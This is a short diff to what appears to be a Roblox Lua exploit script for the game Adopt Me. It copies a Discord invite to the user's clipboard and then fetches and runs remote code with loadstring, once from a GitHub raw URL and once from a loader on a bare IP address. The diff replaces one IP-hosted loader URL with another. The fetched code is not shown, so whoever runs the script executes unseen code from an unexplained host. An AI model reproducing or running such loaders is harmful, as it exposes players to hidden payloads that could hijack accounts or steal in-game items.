@@ -1,4 +1,4 @@
 setclipboard("https://discord.gg/5QuSfb2nmT")
 RUN_AFTER = loadstring(game:HttpGet("https://raw.githubusercontent.com/namnnni2/Nam/refs/heads/main/Adoptme.luau"))()
 ID="abe67d68-7c7c-4f66-9a09-0e80071cd919";
-loadstring(game:HttpGet("http://5.129.235.74:3910/cdn/loader.luau"))()
+loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
